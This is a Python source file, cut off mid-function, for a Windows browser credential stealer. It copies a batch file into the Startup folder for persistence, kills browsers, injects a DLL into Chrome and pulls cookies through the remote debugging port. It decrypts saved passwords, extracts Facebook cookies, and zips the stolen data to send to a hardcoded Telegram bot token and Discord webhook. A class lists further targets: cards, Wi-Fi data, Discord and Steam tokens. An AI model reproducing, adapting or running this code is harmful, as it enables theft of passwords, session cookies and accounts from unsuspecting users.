import sys
sys.dont_write_bytecode = True
import win32con
import win32event
import ctypes
from ctypes import wintypes
from pathlib import Path
import json
import shutil
import sqlite3
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import re
import os
import asyncio
import aiohttp
import base64
import time
import subprocess
import requests
import logging
import zipfile
import tempfile
import webbrowser
import threading
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from websocket import create_connection
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from typing import List, Tuple
from requests.exceptions import RequestException

# Define kernel32 and ntdll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Define structures
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260)
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", ctypes.c_ushort),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD)
    ]

# Configure function signatures
for func, argtypes, restype in [
    (kernel32.CreateToolhelp32Snapshot, [wintypes.DWORD, wintypes.DWORD], wintypes.HANDLE),
    (kernel32.Process32FirstW, [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)], wintypes.BOOL),
    (kernel32.Process32NextW, [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)], wintypes.BOOL),
    (kernel32.OpenProcess, [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD], wintypes.HANDLE),
    (kernel32.VirtualAllocEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD], ctypes.c_void_p),
    (kernel32.WriteProcessMemory, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)], wintypes.BOOL),
    (kernel32.GetProcAddress, [wintypes.HMODULE, ctypes.c_char_p], ctypes.c_void_p),
    (kernel32.CreateRemoteThread, [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)], wintypes.HANDLE),
    (kernel32.GetExitCodeThread, [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)], wintypes.BOOL),
    (kernel32.VirtualFreeEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD], wintypes.BOOL),
    (kernel32.WaitForSingleObject, [wintypes.HANDLE, wintypes.DWORD], wintypes.DWORD),
    (kernel32.CreateEventW, [ctypes.c_void_p, wintypes.BOOL, wintypes.BOOL, wintypes.LPCWSTR], wintypes.HANDLE),
    (kernel32.ResetEvent, [wintypes.HANDLE], wintypes.BOOL),
    (kernel32.GetModuleHandleW, [wintypes.LPCWSTR], wintypes.HMODULE),
    (kernel32.CloseHandle, [wintypes.HANDLE], wintypes.BOOL),
    (kernel32.VirtualQueryEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t], ctypes.c_size_t),
    (ntdll.NtCreateThreadEx, [ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD, ctypes.c_void_p, wintypes.HANDLE,
                              ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.c_size_t, ctypes.c_size_t,
                              ctypes.c_size_t, ctypes.c_void_p], ctypes.c_ulong)
]:
    func.argtypes = argtypes
    func.restype = restype

PROCESS_ACCESS = win32con.PROCESS_CREATE_THREAD | win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_OPERATION | win32con.PROCESS_VM_WRITE | win32con.PROCESS_VM_READ

class Startup:
    def __init__(self):
        self.RoamingAppData = os.getenv("APPDATA")

    async def FolderStartup(self):
        try:
            # Get the directory of the current Python script/executable
            exe_dir = os.path.dirname(os.path.abspath(sys.executable if hasattr(sys, 'frozen') else __file__))
            # Path to f.bat in the same directory
            source_file = os.path.join(exe_dir, "f.bat")
            # User's startup path
            startup_path = os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "f.bat")
            
            if os.path.isfile(startup_path):
                print("[+] File already in startup!")
            else:
                if not os.path.isfile(source_file):
                    print(f"[-] f.bat not found in {exe_dir}")
                    return
                shutil.copy(source_file, startup_path)
                print(f"[+] Copied f.bat to {startup_path}")
        except Exception as e:
            print(f"[-] Error in FolderStartup: {str(e)}")

async def main():
    startup = Startup()
    await startup.FolderStartup()

BASE_DEBUG_PORT = 9222
bot_token = "7919359258:AAEyTARbGixlOUMGEW4NzQhge2wrNLcQRW0"
chat_id = "-1002539966217"
webhook_message = f'https://api.telegram.org/bot{bot_token}/sendMessage'
webhook_document = f'https://api.telegram.org/bot{bot_token}/sendDocument'
discord_webhook_url = "https://discord.com/api/webhooks/1376445873684353084/-pMOW8hO-cwKtOhkFiqM2lmI3DJvlRkHyqRCkusi594EIykcCxY0jDii1MAKBB3mINIk"
BROWSERS = {"chrome": "chrome.exe", "brave": "brave.exe", "edge": "msedge.exe"}
browser_paths = {}
user_data_dirs = {}

browsers = {
    "chrome": ("Google\\Chrome", "chrome.exe"),
    "edge": ("Microsoft\\Edge", "msedge.exe"),
    "opera": ("Opera", "launcher.exe", "Opera Software\\Opera Stable"),
    "operagx": ("Opera GX", "launcher.exe", "Opera Software\\Opera GX Stable"),
    "brave": ("BraveSoftware\\Brave-Browser", "brave.exe"),
    "avant_browser": ("Avant Browser", "avant.exe"),
    "coccoc": ("CocCoc\\Browser", "browser.exe")
}

for browser, info in browsers.items():
    folder, exe = info[:2]
    browser_paths[browser] = [
        os.path.join("C:\\Program Files", folder, "Application", exe),
        os.path.join("C:\\Program Files (x86)", folder, "Application", exe),
        os.path.join(os.getenv("LOCALAPPDATA"), folder, "Application", exe)
    ]
    if len(info) == 3:
        user_data_dirs[browser] = os.path.join(os.getenv("APPDATA"), info[2])
    else:
        user_data_dirs[browser] = os.path.join(os.getenv("LOCALAPPDATA"), folder, "User Data")

class HandleGuard:
    def __init__(self, handle):
        self._handle = handle if handle != -1 else None

    def __del__(self):
        if self._handle:
            kernel32.CloseHandle(self._handle)

    def get(self):
        return self._handle

class Maincookie:
    temp_dir = tempfile.mkdtemp()
    collected_files = []
    DEBUG_PORT = BASE_DEBUG_PORT
    BROWSERS = {"chrome": "chrome.exe", "brave": "brave.exe", "edge": "msedge.exe"}

    @staticmethod
    def get_pid(proc_name):
        snap = HandleGuard(kernel32.CreateToolhelp32Snapshot(0x2, 0))
        if not snap.get():
            return None
        entry = PROCESSENTRY32W(dwSize=ctypes.sizeof(PROCESSENTRY32W))
        if not kernel32.Process32FirstW(snap.get(), ctypes.byref(entry)):
            return None
        while True:
            if entry.szExeFile.lower() == proc_name.lower():
                return entry.th32ProcessID
            if not kernel32.Process32NextW(snap.get(), ctypes.byref(entry)):
                break
        return None

    @staticmethod
    def extract_facebook_cookies(netscape_file):
        facebook_cookies = []
        try:
            netscape_file = os.path.normpath(netscape_file)
            if not os.path.exists(netscape_file):
                print(f"Error: File {netscape_file} does not exist")
                return "Error: Cookie file not found"
            with open(netscape_file, "r", encoding="utf-8") as file:
                for line in file:
                    if line.startswith("#") or not line.strip():
                        continue
                    parts = line.strip().split("\t")
                    if len(parts) >= 7 and parts[0].lower().endswith("facebook.com"):
                        name = parts[5]
                        value = parts[6]
                        facebook_cookies.append(f"{name}={value}")
            return "; ".join(facebook_cookies) if facebook_cookies else "No .facebook.com cookies found"
        except Exception as e:
            print(f"Error reading Netscape file {netscape_file}: {e}")
            return f"Error processing file: {str(e)}"

    @staticmethod
    def extract_passwords_chromium(user_data_dir, profile, browser_name):
        login_data_path = os.path.join(user_data_dir, profile, "Login Data")
        if not os.path.exists(login_data_path):
            print(f"Login Data file not found for {browser_name} profile {profile}")
            return []
        temp_db = os.path.join(Maincookie.temp_dir, f"{browser_name}_{profile}_login_data")
        try:
            with open(login_data_path, "rb") as src, open(temp_db, "wb") as dst:
                dst.write(src.read())
            passwords = []
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                    if url and username and password:
                        passwords.append({
                            "origin": url,
                            "username": username,
                            "password": password
                        })
                except Exception as e:
                    print(f"Error decrypting password for {url}: {e}")
                    passwords.append({
                        "origin": url,
                        "username": username,
                        "password": "Error"
                    })
            conn.close()
            os.remove(temp_db)
            return passwords
        except Exception as e:
            print(f"Error processing Login Data for {browser_name} profile {profile}: {e}")
            return []

    @staticmethod
    def extract_passwords_firefox(user_data_dir, profile, browser_name):
        print(f"Password extraction for {browser_name} not implemented (requires NSS decryption)")
        return []

    @staticmethod
    def terminate_headless_processes(proc_name):
        try:
            snap = HandleGuard(kernel32.CreateToolhelp32Snapshot(0x2, 0))
            if not snap.get():
                return
            entry = PROCESSENTRY32W(dwSize=ctypes.sizeof(PROCESSENTRY32W))
            if not kernel32.Process32FirstW(snap.get(), ctypes.byref(entry)):
                return
            while True:
                if entry.szExeFile.lower() == proc_name.lower():
                    pid = entry.th32ProcessID
                    try:
                        cmdline = subprocess.check_output(
                            ['wmic', 'process', 'where', f'ProcessId={pid}', 'get', 'CommandLine', '/format:list'],
                            stderr=subprocess.PIPE,
                            universal_newlines=True
                        ).strip()
                        if cmdline and "--no-sandbox" in cmdline:
                            proc_handle = HandleGuard(kernel32.OpenProcess(
                                win32con.PROCESS_TERMINATE, False, pid))
                            if proc_handle.get():
                                kernel32.TerminateProcess(proc_handle.get(), 1)
                    except:
                        pass
                if not kernel32.Process32NextW(snap.get(), ctypes.byref(entry)):
                    break
        except:
            pass

    @staticmethod
    def kill_all_browser_processes(proc_name, user_data_dir=None):
        for _ in range(5):
            try:
                print(f"Attempting to terminate {proc_name}...")
                subprocess.run(
                    ["taskkill", "/F", "/IM", proc_name],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(2)
                pid = Maincookie.get_pid(proc_name)
                if not pid:
                    if user_data_dir:
                        lockfile = os.path.join(user_data_dir, "lockfile")
                        if os.path.exists(lockfile):
                            try:
                                os.remove(lockfile)
                                print(f"Removed lockfile: {lockfile}")
                            except Exception as e:
                                print(f"Failed to remove lockfile {lockfile}: {e}")
                    print(f"Successfully terminated {proc_name}")
                    return True
                else:
                    print(f"{proc_name} (PID: {pid}) still running after attempt")
            except Exception as e:
                print(f"Error terminating {proc_name}: {e}")
            time.sleep(2)
        print(f"Failed to terminate {proc_name} after 5 attempts")
        return False

    @staticmethod
    def get_dll_path():
        exe_path = Path(sys.executable if hasattr(sys, 'frozen') else __file__).parent
        dll_path = exe_path / "chrome_decrypt.dll"
        return str(dll_path) if dll_path.exists() else ""

    @staticmethod
    def inject_dll(proc, dll_path):
        dll_bytes = (dll_path + '\0').encode('ascii')
        size = len(dll_bytes)
        remote_mem = kernel32.VirtualAllocEx(proc, None, size, win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_READWRITE)
        if not remote_mem:
            return False
        try:
            written = ctypes.c_size_t()
            if not kernel32.WriteProcessMemory(proc, remote_mem, dll_bytes, size, ctypes.byref(written)) or written.value != size:
                return False
            load_library = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
            if not load_library:
                return False
            th = HandleGuard(kernel32.CreateRemoteThread(proc, None, 0, load_library, remote_mem, 0, None))
            if not th.get() or kernel32.WaitForSingleObject(th.get(), 15000) != win32con.WAIT_OBJECT_0:
                return False
            exit_code = wintypes.DWORD()
            return kernel32.GetExitCodeThread(th.get(), ctypes.byref(exit_code)) and exit_code.value not in (0, 0xC0000005)
        finally:
            kernel32.VirtualFreeEx(proc, remote_mem, 0, win32con.MEM_RELEASE)

    @staticmethod
    def find_browser_path(browser_name):
        for path in browser_paths.get(browser_name, []):
            if os.path.exists(path):
                return path
        return None

    @staticmethod
    def get_user_data_dir(browser_name):
        user_data_dir = user_data_dirs.get(browser_name, None)
        if user_data_dir and os.path.exists(user_data_dir):
            try:
                os.listdir(user_data_dir)
                return user_data_dir
            except:
                pass
        temp_user_data_dir = os.path.join(Maincookie.temp_dir, f"{browser_name}_user_data")
        os.makedirs(temp_user_data_dir, exist_ok=True)
        return temp_user_data_dir

    @staticmethod
    def get_profiles(user_data_dir, browser_name):
        profiles = []
        if os.path.exists(user_data_dir):
            for item in os.listdir(user_data_dir):
                full_path = os.path.join(user_data_dir, item)
                if os.path.isdir(full_path) and (item.startswith("Profile") or item == "Default"):
                    profiles.append(item)
            if not profiles:
                os.makedirs(os.path.join(user_data_dir, "Default"), exist_ok=True)
                profiles.append("Default")
        return profiles

    @staticmethod
    def start_headless_browser(browser_path, user_data_dir):
        args = [
            browser_path,
            f"--user-data-dir={user_data_dir}",
            "--no-sandbox",
            "--headless=new"
        ]
        print(f"Launching browser with args: {' '.join(args)}")
        try:
            subprocess.Popen(
                args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(10)
            return True
        except:
            return False

    @staticmethod
    def start_debugged_browser(browser_path, user_data_dir, profile, debug_port):
        args = [
            browser_path,
            f"--remote-debugging-port={debug_port}",
            f"--user-data-dir={user_data_dir}",
            f"--profile-directory={profile}",
            f"--remote-allow-origins=http://localhost:{debug_port}",
            "--no-sandbox",
            "--headless=new"
        ]
        print(f"Launching browser with args: {' '.join(args)}")
        try:
            subprocess.Popen(
                args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            for _ in range(5):
                try:
                    requests.get(f"http://localhost:{debug_port}/json", timeout=2)
                    return True
                except:
                    time.sleep(2)
            return False
        except:
            return False

    @staticmethod
    def get_debug_ws_url(debug_port):
        for _ in range(5):
            try:
                response = requests.get(f"http://localhost:{debug_port}/json", timeout=5)
                response.raise_for_status()
                data = response.json()
                if data and "webSocketDebuggerUrl" in data[0]:
                    return data[0]["webSocketDebuggerUrl"]
                time.sleep(1)
            except:
                time.sleep(1)
        return None

    @staticmethod
    def json_to_netscape(json_cookies):
        try:
            cookies = json.loads(json_cookies)
            netscape_format = ["# Netscape HTTP Cookie File\n"]
            for cookie in cookies:
                domain = cookie.get("host", cookie.get("domain", ""))
                if not domain:
                    continue
                include_subdomains = "TRUE" if domain.startswith(".") else "FALSE"
                path = cookie.get("path", "/")
                secure = "TRUE" if cookie.get("secure", False) else "FALSE"
                expires = str(int(cookie.get("expires", 0)))
                name = cookie.get("name", "")
                value = cookie.get("value", "")
                if name and value:
                    netscape_format.append(
                        f"{domain}\t{include_subdomains}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
                    )
            return "\n".join(netscape_format) if netscape_format else "# Netscape HTTP Cookie File\n# No cookies found"
        except (json.JSONDecodeError, TypeError, ValueError) as e:
            print(f"Error parsing JSON cookies: {e}")
            return "# Netscape HTTP Cookie File\n# Error parsing cookies"

    @staticmethod
    def json_to_password_format(json_passwords, browser_name):
        try:
            passwords = json.loads(json_passwords) if isinstance(json_passwords, str) else json_passwords
            formatted_passwords = []
            for login in passwords:
                url = login.get("origin", "")
                username = login.get("username", "")
                password = login.get("password", "Error")
                formatted_passwords.append(
                    f"URL: {url}\nUsername: {username}\nPassword: {password}\nBrowser: {browser_name}\n"
                )
            return "".join(formatted_passwords)
        except json.JSONDecodeError as e:
            print(f"JSON parsing error in passwords: {e}")
            return ""
        except Exception as e:
            print(f"Error processing passwords: {e}")
            return ""

    @staticmethod
    def save_cookies_to_file(filename, cookies, is_json=False):
        json_dir = os.path.join(Maincookie.temp_dir, "JSON")
        filepath = os.path.join(json_dir if is_json else Maincookie.temp_dir, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as file:
            file.write(cookies)
        if os.path.exists(filepath) and filepath not in Maincookie.collected_files:
            Maincookie.collected_files.append(filepath)
            print(f"Saved {'JSON' if is_json else 'Netscape'} cookies to {filepath}")
        else:
            print(f"Error: Failed to save cookies to {filepath}")

    @staticmethod
    def save_passwords_to_file(filename, passwords):
        filepath = os.path.join(Maincookie.temp_dir, filename)
        os.makedirs(Maincookie.temp_dir, exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as file:
            file.write(passwords)
        if filepath not in Maincookie.collected_files:
            Maincookie.collected_files.append(filepath)
            print(f"Saved passwords to {filepath}")

    @staticmethod
    def collect_profile_files(browser, profiles):
        temp_dir = Path(tempfile.gettempdir())
        browser_display_name = {"chrome": "Google Chrome", "edge": "Microsoft Edge", "brave": "Brave", "coccoc": "CocCoc"}.get(browser.lower(), browser)
        decrypt_files = [f for f in temp_dir.glob(f"{browser}*_decrypt_[cC][oO][oK][kK][iI][eE][sS]*.txt") if f.is_file()] + \
                        [f for f in temp_dir.glob(f"{browser}*_decrypt_[pP][aA][sS][sS][wW][oO][rR][dD][sS]*.txt") if f.is_file()]
        print(f"Found decrypt files for {browser}: {[f.name for f in decrypt_files]}")
        for decrypt_file in decrypt_files:
            file_name = decrypt_file.name
            try:
                profile = "Default"
                for prof in profiles:
                    if prof.lower() in file_name.lower():
                        profile = prof
                        break
                file_type = "cookies" if "cookies" in file_name.lower() else "passwords"
                dst_file = Path(Maincookie.temp_dir) / f"{file_type}_{browser}_{profile}.txt"
                print(f"Processing {file_name} as {file_type} for profile {profile}")
                with open(decrypt_file, "r", encoding="utf-8") as f:
                    content = f.read()
                if file_type == "cookies":
                    json_filename = f"cookies_{browser}_{profile}.json"
                    Maincookie.save_cookies_to_file(json_filename, content, is_json=True)
                    formatted_content = Maincookie.json_to_netscape(content)
                    Maincookie.save_cookies_to_file(dst_file.name, formatted_content)
                    if dst_file.exists():
                        time.sleep(0.5)
                        facebook_cookies = Maincookie.extract_facebook_cookies(str(dst_file))
                        if facebook_cookies and "No .facebook.com cookies found" not in facebook_cookies:
                            facebook_cookie_file = Path(Maincookie.temp_dir) / f"facebook_cookies_{browser}_{profile}.txt"
                            with open(facebook_cookie_file, "w", encoding="utf-8") as f:
                                f.write(facebook_cookies)
                            if str(facebook_cookie_file) not in Maincookie.collected_files:
                                Maincookie.collected_files.append(str(facebook_cookie_file))
                                print(f"Saved Facebook cookies to {facebook_cookie_file}")
                        else:
                            print(f"No valid Facebook cookies found for {browser} profile {profile}")
                    else:
                        print(f"Error: Cookie file {dst_file} was not created")
                else:
                    formatted_content = Maincookie.json_to_password_format(content, browser_display_name)
                    Maincookie.save_passwords_to_file(dst_file.name, formatted_content)
                if dst_file.exists():
                    decrypt_file.unlink()
                    print(f"Deleted source file {file_name}")
            except Exception as e:
                print(f"Error processing {file_name}: {e}")

    @staticmethod
    def get_country_and_ip():
        try:
            response = requests.get("https://ipinfo.io", timeout=5)
            response.raise_for_status()
            data = response.json()
            return data.get("country", "Unknown"), data.get("ip", "0.0.0.0")
        except:
            return "Unknown", "0.0.0.0"

    @staticmethod
    def process_browser(browser):
        browser_name = browser.lower()
        browser_path = Maincookie.find_browser_path(browser_name)
        if not browser_path:
            print(f"Browser path not found for {browser_name}")
            return
        user_data_dir = Maincookie.get_user_data_dir(browser_name)
        if not user_data_dir:
            print(f"User data directory not found for {browser_name}")
            return
        profiles = Maincookie.get_profiles(user_data_dir, browser_name)
        if not profiles:
            print(f"No profiles found for {browser_name}")
            return
        chromium_based = browser_name in [
            "chrome", "edge", "brave", "coccoc", "opera", "operagx", "vivaldi",
            "yandex", "chromium", "uc_browser", "comodo_dragon", "slimjet"
        ]
        firefox_based = browser_name in ["firefox", "waterfox", "pale_moon", "seamonkey"]
        if browser_name == "chrome":
            proc_name = Maincookie.BROWSERS.get(browser_name)
            Maincookie.terminate_headless_processes(proc_name)
            pid = Maincookie.get_pid(proc_name)
            started_headless = False
            if not pid:
                if not Maincookie.start_headless_browser(browser_path, user_data_dir):
                    return
                pid = Maincookie.get_pid(proc_name)
                started_headless = True
                if not pid:
                    return
            proc = HandleGuard(kernel32.OpenProcess(PROCESS_ACCESS, False, pid))
            if not proc.get():
                if started_headless:
                    Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
                return
            dll_path = Maincookie.get_dll_path()
            if not dll_path:
                if started_headless:
                    Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
                return
            if not Maincookie.inject_dll(proc.get(), dll_path):
                if started_headless:
                    Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
                return
            event = HandleGuard(kernel32.CreateEventW(None, True, False, "Global\\ChromeDecryptWorkDoneEvent"))
            if event.get():
                kernel32.ResetEvent(event.get())
                kernel32.WaitForSingleObject(event.get(), 60000)
            Maincookie.collect_profile_files(browser_name, profiles)
            if started_headless:
                Maincookie.kill_all_browser_processes(proc_name, user_data_dir)
        else:
            debug_port = Maincookie.DEBUG_PORT
            for profile in profiles:
                Maincookie.terminate_headless_processes(Maincookie.BROWSERS.get(browser_name, browsers.get(browser_name, [None, browser_name])[1]))
                if not Maincookie.start_debugged_browser(browser_path, user_data_dir, profile, debug_port):
                    Maincookie.close_debug_port(debug_port)
                    debug_port += 1
                    Maincookie.DEBUG_PORT += 1
                    continue
                ws_url = Maincookie.get_debug_ws_url(debug_port)
                if not ws_url:
                    Maincookie.close_debug_port(debug_port)
                    debug_port += 1
                    Maincookie.DEBUG_PORT += 1
                    continue
                try:
                    ws = create_connection(ws_url, timeout=10)
                    ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
                    response = ws.recv()
                    ws.close()
                    cookies = json.loads(response).get("result", {}).get("cookies", [])
                    if cookies:
                        formatted_cookies = [
                            {
                                "domain": cookie.get("domain", ""),
                                "name": cookie.get("name", ""),
                                "value": cookie.get("value", ""),
                                "path": cookie.get("path", "/"),
                                "secure": cookie.get("secure", False),
                                "expires": cookie.get("expires", 0)
                            } for cookie in cookies
                        ]
                        cookie_data = json.dumps(formatted_cookies, indent=2)
                        json_filename = f"cookies_{browser_name}_{profile}.json"
                        Maincookie.save_cookies_to_file(json_filename, cookie_data, is_json=True)
                        netscape_cookies = Maincookie.json_to_netscape(cookie_data)
                        filename = f"cookies_{browser_name}_{profile}.txt"
                        Maincookie.save_cookies_to_file(filename, netscape_cookies)
                    if chromium_based:
                        passwords = Maincookie.extract_passwords_chromium(user_data_dir, profile, browser_name)
                        if passwords:
                            password_data = json.dumps(passwords, indent=2)
                            json_filename = f"passwords_{browser_name}_{profile}.json"
                            Maincookie.save_cookies_to_file(json_filename, password_data, is_json=True)
                            formatted_passwords = Maincookie.json_to_password_format(passwords, browser_name)
                            password_filename = f"passwords_{browser_name}_{profile}.txt"
                            Maincookie.save_passwords_to_file(password_filename, formatted_passwords)
                    elif firefox_based:
                        passwords = Maincookie.extract_passwords_firefox(user_data_dir, profile, browser_name)
                        if passwords:
                            password_data = json.dumps(passwords, indent=2)
                            json_filename = f"passwords_{browser_name}_{profile}.json"
                            Maincookie.save_cookies_to_file(json_filename, password_data, is_json=True)
                            formatted_passwords = Maincookie.json_to_password_format(passwords, browser_name)
                            password_filename = f"passwords_{browser_name}_{profile}.txt"
                            Maincookie.save_passwords_to_file(password_filename, formatted_passwords)
                except Exception as e:
                    print(f"Error processing {browser_name} profile {profile}: {e}")
                Maincookie.close_debug_port(debug_port)
                debug_port += 1
                Maincookie.DEBUG_PORT += 1
                time.sleep(2)

    @staticmethod
    def create_zip_file():
        country, ip = Maincookie.get_country_and_ip()
        zip_name = os.path.join(Maincookie.temp_dir, f"{country}_{ip}.zip")
        print(f"Creating ZIP with files: {Maincookie.collected_files}")
        try:
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in Maincookie.collected_files:
                    if os.path.exists(file):
                        if "JSON" in file:
                            arcname = os.path.join("JSON", os.path.basename(file))
                        else:
                            arcname = os.path.basename(file)
                        zipf.write(file, arcname)
            if os.path.exists(zip_name) and zipfile.is_zipfile(zip_name):
                print(f"ZIP file created successfully: {zip_name}")
                return zip_name
            else:
                print(f"Failed to create valid ZIP file: {zip_name}")
                return None
        except Exception as e:
            print(f"Error creating ZIP file: {e}")
            return None

    @staticmethod
    def send_zip_to_telegram(zip_name):
        if not zip_name:
            print("No ZIP file provided.")
            return False
        if not os.path.exists(zip_name):
            print(f"ZIP file does not exist: {zip_name}")
            return False
        if not zipfile.is_zipfile(zip_name):
            print(f"File is not a valid ZIP: {zip_name}")
            return False
        print(f"Attempting to send ZIP file to Telegram: {zip_name}")
        session = requests.Session()
        max_retries = 2
        timeout = 5
        for attempt in range(max_retries):
            try:
                with open(zip_name, "rb") as file:
                    response = session.post(
                        webhook_document,
                        data={"chat_id": chat_id},
                        files={"document": (os.path.basename(zip_name), file)},
                        timeout=timeout
                    )
                    response.raise_for_status()
                    print(f"File sent successfully to Telegram: {zip_name}")
                    return True
            except RequestException as e:
                print(f"Attempt {attempt + 1}/{max_retries} failed: {e}")
                if attempt < max_retries - 1:
                    print(f"Retrying in {timeout} seconds...")
                    time.sleep(timeout)
                else:
                    print(f"Failed to send file to Telegram after {max_retries} attempts.")
                    return False
            except Exception as e:
                print(f"Unexpected error on attempt {attempt + 1}: {e}")
                return False
        return False

    @staticmethod
    async def send_zip_to_discord(zip_name):
        if not zip_name:
            print("No ZIP file provided for Discord.")
            return False
        if not os.path.exists(zip_name):
            print(f"ZIP file does not exist: {zip_name}")
            return False
        if not zipfile.is_zipfile(zip_name):
            print(f"File is not a valid ZIP: {zip_name}")
            return False
        print(f"Attempting to send ZIP file to Discord: {zip_name}")
        file_size_mb = os.path.getsize(zip_name) / (1024 * 1024)
        if file_size_mb > 25:
            print(f"File size {file_size_mb:.2f}MB exceeds Discord's 25MB limit for regular webhooks.")
            return False
        async with aiohttp.ClientSession() as session:
            try:
                with open(zip_name, "rb") as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(zip_name))
                    async with session.post(discord_webhook_url, data=form) as response:
                        if response.status == 200 or response.status == 204:
                            print(f"File sent successfully to Discord: {zip_name}")
                            return True
                        else:
                            print(f"Failed to send file to Discord: HTTP {response.status}")
                            return False
            except Exception as e:
                print(f"Error sending file to Discord: {e}")
                return False

    @staticmethod
    def close_debug_port(debug_port):
        try:
            output = subprocess.check_output(
                f"netstat -ano | findstr :{debug_port}",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.STDOUT,
                text=True,
            )
            for line in output.strip().splitlines():
                pid = line.strip().split()[-1]
                if pid != "0":
                    subprocess.run(
                        ["taskkill", "/F", "/PID", pid],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        check=True
                    )
        except:
            pass

    @staticmethod
    async def execute():
        temp_dir = Path(tempfile.gettempdir())
        for file in ["chrome_decrypt.log", "chrome_appbound_key.txt"]:
            try:
                (temp_dir / file).unlink()
            except:
                pass

        # Identify browsers that exist on the system (excluding Chrome)
        browsers_to_terminate = {}
        for browser, info in browsers.items():
            if browser.lower() != "chrome":
                proc_name = info[1]
                for path in browser_paths.get(browser, []):
                    if os.path.exists(path):
                        browsers_to_terminate[browser] = proc_name
                        break

        # Terminate only existing non-Chrome browsers
        for browser, proc_name in browsers_to_terminate.items():
            print(f"Terminating {browser} process ({proc_name})...")
            Maincookie.kill_all_browser_processes(proc_name)

        # Process all browsers
        for browser_name in browser_paths.keys():
            Maincookie.process_browser(browser_name)

        # Create and send ZIP file
        if Maincookie.collected_files:
            zip_name = Maincookie.create_zip_file()
            if zip_name:
                # Send to Telegram
                telegram_success = Maincookie.send_zip_to_telegram(zip_name)
                print(f"Telegram send {'succeeded' if telegram_success else 'failed'}")
                
                # Send to Discord
                discord_success = await Maincookie.send_zip_to_discord(zip_name)
                print(f"Discord send {'succeeded' if discord_success else 'failed'}")

class Variables:
    Passwords = []
    Cards = []
    Cookies = []
    Historys = []
    Downloads = []
    Autofills = []
    Bookmarks = []
    Wifis = []
    SystemInfo = []
    ClipBoard = []
    Processes = []
    Network = []
    FullTokens = []
    ValidatedTokens = []
    DiscordAccounts = []
    SteamAccounts = []

class SubModules:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        try:
            pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()
            pOptionalEntropy = None
            if optional_entropy:
                try:
                    optional_entropy = optional_entropy.encode("utf-16")
                    pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
                except UnicodeEncodeError as e:
                    logging.error(f"Failed to encode optional_entropy: {e}")
                    raise
            if ctypes.windll.Crypt32.CryptUnprotectData(
